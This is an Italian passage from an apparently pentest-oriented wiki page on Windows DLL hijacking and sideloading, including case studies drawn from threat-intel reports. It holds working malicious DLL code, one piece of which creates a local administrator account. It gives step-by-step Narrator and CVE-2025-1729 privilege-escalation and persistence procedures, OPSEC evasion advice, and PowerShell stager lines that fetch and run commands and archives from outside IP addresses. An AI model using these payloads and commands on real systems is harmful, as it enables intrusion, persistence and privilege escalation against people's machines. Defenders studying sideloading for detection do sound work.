        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Esempio di DLL C++ con creazione di un utente</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>DLL C alternativa con entry point del thread</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## Caso di studio: Hijack della DLL di localizzazione TTS di Narrator OneCore (accessibilità/ATs)

All'avvio, Windows Narrator.exe continua a cercare una DLL di localizzazione prevedibile e specifica per la lingua, che può essere oggetto di hijack per eseguire codice arbitrario e ottenere persistenza.<sup>[[7]](#references)</sup>

Fatti chiave
- Percorso di ricerca (build attuali): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Percorso legacy (build precedenti): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Se nel percorso OneCore è presente una DLL scrivibile e controllata dall'attaccante, viene caricata ed esegue `DllMain(DLL_PROCESS_ATTACH)`. Non sono necessarie esportazioni.

Individuazione con Procmon
- Filtro: `Process Name is Narrator.exe` e `Operation is Load Image` oppure `CreateFile`.
- Avvia Narrator e osserva il tentativo di caricamento del percorso indicato sopra.

DLL minima
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

Silenzio OPSEC
- Un hijack ingenuo renderà visibile/evidenzierà l'interfaccia utente. Per operare senza farsi notare, all'attach enumera i thread di Narrator, apri il thread principale (`OpenThread(THREAD_SUSPEND_RESUME)`) e sospendilo con `SuspendThread`; continua nel tuo thread. Consulta il PoC per il codice completo.<sup>[[8]](#references)</sup>

Trigger e persistenza tramite configurazione Accessibility
- Contesto utente (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Con la configurazione precedente, avviando Narrator viene caricata la DLL impiantata. Sul desktop sicuro (schermata di accesso), premi CTRL+WIN+ENTER per avviare Narrator; la DLL viene eseguita come SYSTEM sul desktop sicuro.

Esecuzione SYSTEM attivata da RDP (lateral movement)
- Abilita il livello di sicurezza RDP classico: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Connettiti all'host tramite RDP e, alla schermata di accesso, premi CTRL+WIN+ENTER per avviare Narrator; la DLL viene eseguita come SYSTEM sul desktop sicuro.
- L'esecuzione si interrompe quando la sessione RDP viene chiusa: esegui tempestivamente l'injection o la migrazione.

Bring Your Own Accessibility (BYOA)
- Puoi clonare una voce di registro di un Accessibility Tool (AT) integrato (ad es. CursorIndicator), modificarla per puntare a un binario/DLL arbitrario, importarla e impostare `configuration` sul nome di quell'AT. In questo modo, l'esecuzione arbitraria viene eseguita tramite il framework Accessibility.

Note
- Per scrivere in `%windir%\System32` e modificare i valori HKLM sono necessari i diritti di amministratore.
- Tutta la logica del payload può risiedere in `DLL_PROCESS_ATTACH`; non sono necessari export.

## Caso di studio: CVE-2025-1729 - Privilege Escalation tramite TPQMAssistant.exe

Questo caso dimostra il **Phantom DLL Hijacking** in TrackPoint Quick Menu di Lenovo (`TPQMAssistant.exe`), identificato come **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Dettagli della vulnerabilità

- **Componente**: `TPQMAssistant.exe`, situato in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Attività pianificata**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` viene eseguita ogni giorno alle 9:30 nel contesto dell'utente connesso.
- **Permessi della directory**: scrivibile da `CREATOR OWNER`, consentendo agli utenti locali di inserire file arbitrari.
- **Comportamento della ricerca DLL**: tenta innanzitutto di caricare `hostfxr.dll` dalla directory di lavoro e registra "NAME NOT FOUND" se il file manca, indicando la precedenza della ricerca nella directory locale.

### Implementazione dell'exploit

Un attacker può collocare uno stub malevolo di `hostfxr.dll` nella stessa directory, sfruttando l'assenza della DLL per ottenere l'esecuzione di codice nel contesto dell'utente:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Flusso dell'attacco

1. Come utente standard, copia `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Attendi che l'attività pianificata venga eseguita alle 9:30 AM nel contesto dell'utente corrente.
3. Se al momento dell'esecuzione dell'attività è connesso un amministratore, la DLL malevola viene eseguita nella sessione dell'amministratore con integrità media.
4. Combina tecniche standard di UAC bypass per ottenere privilegi SYSTEM partendo dall'integrità media.

## Caso di studio: dropper MSI con CustomAction + DLL side-loading tramite host firmato (wsc_proxy.exe)

Gli attori delle minacce spesso combinano dropper basati su MSI e DLL side-loading per eseguire payload all'interno di un processo attendibile e firmato.<sup>[[10]](#references)</sup>

Panoramica della catena
- L'utente scarica un MSI. Durante l'installazione tramite GUI, una CustomAction viene eseguita silenziosamente (ad es. LaunchApplication o un'azione VBScript) e ricostruisce la fase successiva a partire da risorse incorporate.
- Il dropper scrive un EXE legittimo e firmato e una DLL malevola nella stessa directory (coppia di esempio: wsc_proxy.exe firmato da Avast + wsc.dll controllato dall'attaccante).
- All'avvio dell'EXE firmato, l'ordine di ricerca delle DLL di Windows carica prima wsc.dll dalla directory di lavoro, eseguendo codice dell'attaccante sotto un processo padre firmato (ATT&CK T1574.001).

Analisi dell'MSI (cosa cercare)
- Tabella CustomAction:
  - Cerca voci che eseguono file eseguibili o VBScript. Esempio di schema sospetto: LaunchApplication che esegue in background un file incorporato.
  - In Orca (Microsoft Orca.exe), esamina le tabelle CustomAction, InstallExecuteSequence e Binary.
- Payload incorporati/divisi nel CAB dell'MSI:
  - Estrazione amministrativa: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Oppure usa lessmsi: lessmsi x package.msi C:\out
  - Cerca più frammenti di piccole dimensioni concatenati e decrittati da una CustomAction VBScript. Flusso comune:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Sideloading pratico con wsc_proxy.exe
- Inserisci questi due file nella stessa cartella:
  - wsc_proxy.exe: host legittimo firmato (Avast). Il processo tenta di caricare wsc.dll per nome dalla propria directory.
  - wsc.dll: DLL dell'attaccante. Se non sono richieste esportazioni specifiche, può bastare DllMain; altrimenti, crea una DLL proxy e inoltra le esportazioni richieste alla libreria autentica, eseguendo il payload in DllMain.
- Crea un payload DLL minimale:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Per i requisiti di export, usa un framework di proxying (ad es. DLLirant/Spartacus) per generare una DLL di forwarding che esegua anche il tuo payload.

- Questa tecnica si basa sulla risoluzione dei nomi delle DLL da parte del binario host. Se l’host usa percorsi assoluti o flag di caricamento sicuro (ad es. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), l’hijack potrebbe non riuscire.
- KnownDLLs, SxS ed export inoltrati possono influire sulla precedenza e vanno considerati nella scelta del binario host e dell’insieme di export.

## Triadi firmate + payload crittografati (caso di studio ShadowPad)

Check Point ha descritto come Ink Dragon distribuisca ShadowPad usando una **triade di tre file** per confondersi con software legittimo mantenendo il payload principale crittografato su disco:<sup>[[12]](#references)</sup>

1. **EXE host firmato** – vengono abusati software di vendor come AMD, Realtek o NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Gli attaccanti rinominano l’eseguibile per farlo sembrare un binario Windows (ad esempio `conhost.exe`), ma la firma Authenticode rimane valida.
2. **DLL loader malevola** – viene rilasciata accanto all’EXE con un nome previsto (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). La DLL è solitamente un binario MFC offuscato con il framework ScatterBrain; il suo unico compito è trovare il blob crittografato, decrittarlo e mappare ShadowPad in modo riflessivo.
3. **Blob payload crittografato** – spesso viene salvato come `<name>.tmp` nella stessa directory. Dopo aver mappato in memoria il payload decrittato, il loader elimina il file TMP per distruggere le prove forensi.

Note sulle tecniche operative:

* Rinominare l’EXE firmato (mantenendo l’`OriginalFileName` originale nell’header PE) gli permette di spacciarsi per un binario Windows conservando la firma del vendor; replica quindi l’abitudine di Ink Dragon di rilasciare binari che sembrano `conhost.exe` ma sono in realtà utility AMD/NVIDIA.
* Poiché l’eseguibile rimane attendibile, per la maggior parte dei controlli di allowlisting basta che la DLL malevola si trovi accanto ad esso. Concentrati sulla personalizzazione della DLL loader; in genere il processo padre firmato può essere eseguito senza modifiche.
* Il decryptor di ShadowPad si aspetta che il blob TMP si trovi accanto al loader e sia scrivibile, così da poter azzerare il file dopo il mapping. Mantieni la directory scrivibile finché il payload non viene caricato; una volta in memoria, il file TMP può essere eliminato in sicurezza per OPSEC.

### Stager LOLBAS + catena di sideloading di archivi staged (finger → tar/curl → WMI)

Gli operatori abbinano il DLL sideloading a LOLBAS, così che l’unico artefatto personalizzato su disco sia la DLL malevola accanto all’EXE attendibile:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** PowerShell nascosto avvia `cmd.exe /c`, recupera comandi da un server Finger e li passa a `cmd` tramite pipe:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` recupera testo tramite TCP/79; `| cmd` esegue la risposta del server, consentendo agli operatori di cambiare il server di seconda fase lato server.

- **Download/estrazione integrati:** scarica un archivio con un'estensione innocua, estrailo e prepara il target sideload e la DLL in una cartella `%LocalAppData%` casuale:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` nasconde l'avanzamento e segue i reindirizzamenti; `tar -xf` usa il tar integrato in Windows.

- **Avvio WMI/CIM:** Avvia l'EXE tramite WMI, così la telemetria mostra un processo creato da CIM mentre carica la DLL presente nella stessa directory:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Funziona con i binari che preferiscono DLL locali (ad es. `intelbq.exe`, `nearby_share.exe`); il payload (ad es. Remcos) viene eseguito con un nome attendibile.

- **Hunting:** genera un alert su `forfiles` quando `/p`, `/m` e `/c` compaiono insieme; è una combinazione insolita al di fuori degli script di amministrazione.


## Caso di studio: dropper NSIS + sideload del Bitdefender Submission Wizard (Chrysalis)

Una recente intrusione di Lotus Blossom ha sfruttato una catena di aggiornamento attendibile per distribuire un dropper compresso con NSIS che preparava un sideload di DLL e payload interamente in memoria.<sup>[[13]](#references)</sup>

Flusso operativo
- `update.exe` (NSIS) crea `%AppData%\Bluetooth`, lo contrassegna come **HIDDEN**, deposita un Bitdefender Submission Wizard rinominato in `BluetoothService.exe`, una DLL malevola `log.dll` e un blob crittografato `BluetoothService`, quindi avvia l'EXE.
- L'host EXE importa `log.dll` e chiama `LogInit`/`LogWrite`. `LogInit` carica il blob tramite mmap; `LogWrite` lo decifra con uno stream personalizzato basato su LCG (costanti **0x19660D** / **0x3C6EF35F**, materiale della chiave derivato da un hash precedente), sovrascrive il buffer con shellcode in chiaro, libera i dati temporanei e vi salta.
- Per evitare una IAT, il loader risolve le API calcolando l'hash dei nomi degli export con **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, quindi applica un avalanche in stile Murmur (**0x85EBCA6B**) e confronta il risultato con gli hash target con salt.

Shellcode principale (Chrysalis)
- Decifra un modulo principale simile a un PE ripetendo add/XOR/sub con la chiave `gQ2JR&9;` per cinque passaggi, quindi carica dinamicamente `Kernel32.dll` → `GetProcAddress` per completare la risoluzione degli import.
- Ricostruisce a runtime le stringhe dei nomi delle DLL tramite trasformazioni di rotazione dei bit/XOR per carattere, quindi carica `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Usa un secondo resolver che percorre **PEB → InMemoryOrderModuleList**, analizza la tabella degli export in blocchi di 4 byte applicando un mixing in stile Murmur e ricorre a `GetProcAddress` solo se l'hash non viene trovato.

Configurazione incorporata e C2
- La configurazione si trova nel file `BluetoothService` depositato, all'**offset 0x30808** (dimensione **0x980**), ed è decifrata con RC4 usando la chiave `qwhvb^435h&*7`, rivelando l'URL C2 e lo User-Agent.
- I beacon creano un profilo host delimitato da punti, antepongono il tag `4Q`, quindi lo cifrano con RC4 usando la chiave `vAuig34%^325hGV` prima di chiamare `HttpSendRequestA` su HTTPS. Le risposte vengono decifrate con RC4 e gestite tramite uno switch sui tag (`4T` shell, `4V` esecuzione di processi, `4W/4X` scrittura di file, `4Y` lettura/esfiltrazione, `4\\` disinstallazione, `4` casi di enumerazione di unità/file + trasferimento a blocchi).
- La modalità di esecuzione è determinata dagli argomenti CLI: senza argomenti = installa la persistenza (service/Run key) che punta a `-i`; `-i` riavvia se stesso con `-k`; `-k` salta l'installazione ed esegue il payload.

Loader alternativo osservato
- La stessa intrusione ha depositato Tiny C Compiler ed eseguito `svchost.exe -nostdlib -run conf.c` da `C:\ProgramData\USOShared\`, con `libtcc.dll` nella stessa directory. Il sorgente C fornito dall'attaccante incorporava shellcode, che veniva compilato ed eseguito in memoria senza mai scrivere un PE su disco. Esegui una replica con:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Questa fase di compilazione ed esecuzione basata su TCC importava `Wininet.dll` a runtime e scaricava una shellcode di secondo stadio da un URL hardcoded, fornendo un loader flessibile che si mascherava da esecuzione del compilatore.

## Sideloading di un host firmato con proxy degli export + parcheggio del thread host

Alcune catene di DLL sideloading aggiungono **accorgimenti per la stabilità**, affinché l’host legittimo resti attivo abbastanza a lungo da caricare correttamente gli stadi successivi, invece di arrestarsi dopo il caricamento della DLL malevola.<sup>[[11]](#references)</sup>

Schema osservato
- Copiare un EXE attendibile accanto a una DLL malevola, usando il nome atteso della dipendenza, ad esempio `version.dll`.
- La DLL malevola **fa da proxy per ogni export atteso**, inoltrandolo alla DLL di sistema reale (ad esempio `%SystemRoot%\\System32\\version.dll`), così la risoluzione degli import continua a funzionare e il processo host resta operativo.
- Dopo il caricamento, la DLL malevola **applica una patch all’entry point dell’host**, facendo entrare il thread principale in un ciclo infinito di `Sleep` invece di terminare o eseguire percorsi di codice che chiuderebbero il processo.
- Un nuovo thread esegue le operazioni malevole effettive: decrittare il nome o il percorso della DLL di stadio successivo (RC4/XOR sono comuni), quindi avviarla con `LoadLibrary`.

Perché è importante
- Il normale proxying delle DLL preserva la compatibilità delle API, ma non garantisce che l’host resti attivo abbastanza a lungo per gli stadi successivi.
- Mettere in pausa il thread principale con `Sleep(INFINITE)` è un modo semplice per mantenere residente il processo firmato mentre il loader esegue la decrittazione, lo staging o l’inizializzazione della rete in un thread worker.
- Chi cerca solo una `DllMain` sospetta può non rilevare questo schema, se il comportamento interessante si verifica dopo l’applicazione della patch all’entry point dell’host e l’avvio di un thread secondario.

Flusso di lavoro minimo
1. Copiare l’EXE host firmato e determinare quale DLL carica dalla directory locale.
2. Creare una DLL proxy che esporti le stesse funzioni e le inoltri alla DLL legittima.
3. In `DllMain(DLL_PROCESS_ATTACH)`, creare un thread worker.
4. Da quel thread, applicare una patch all’entry point dell’host o alla routine di avvio del thread principale, in modo che entri in un ciclo basato su `Sleep`.
5. Decrittare il nome/la configurazione della DLL di stadio successivo e chiamare `LoadLibrary` oppure eseguire il manual mapping del payload.

Punti di analisi difensiva
- Processi firmati che caricano `version.dll` o librerie comuni simili dalla propria directory applicativa invece che da `System32`.
- Patch in memoria all’entry point del processo subito dopo il caricamento dell’immagine, in particolare salti/chiamate reindirizzati a `Sleep`/`SleepEx`.
- Thread creati da una DLL proxy che chiamano immediatamente `LoadLibrary` su una seconda DLL con un nome decrittato.
- DLL proxy che esportano tutte le funzioni, posizionate accanto a eseguibili di vendor in directory di staging scrivibili come `ProgramData`, `%TEMP%` o percorsi di archivi estratti.

## References

- [1] [Red Canary – Approfondimenti di intelligence: gennaio 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Escalation dei privilegi tramite TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking in Windows. Esempio semplice in C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore distribuisce nuovo malware che prende di mira l’Europa](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: quando i DLL hijack incontrano gli helper di Windows](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Doppelgänger digitali: anatomia delle campagne di impersonificazione in evoluzione che distribuiscono Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Interessi convergenti: analisi dei cluster di minacce che prendono di mira un governo del Sud-est asiatico](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Dentro Ink Dragon: la rete relay e il funzionamento interno di un’operazione offensiva furtiva](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – La backdoor Chrysalis: analisi approfondita del toolkit di Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – Catena HTB Bruno ZipSlip → DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Tracciamento delle campagne di spionaggio del 2026 di Screening Serpens, APT iraniano](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – elemento `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – elemento `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – elemento `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – elemento `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – elemento `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – elemento `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: le operazioni di Nimbus Manticore durante il conflitto iraniano](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Azioni delle attività](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 prende di mira governi e infrastrutture critiche del Sud-est asiatico](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Microsoft Learn – Formato PE](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [27] [FortiGuard Labs – Analisi di una variante di SectopRAT incorporata in software legittimo](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
{{#include ../../../banners/hacktricks-training.md}}
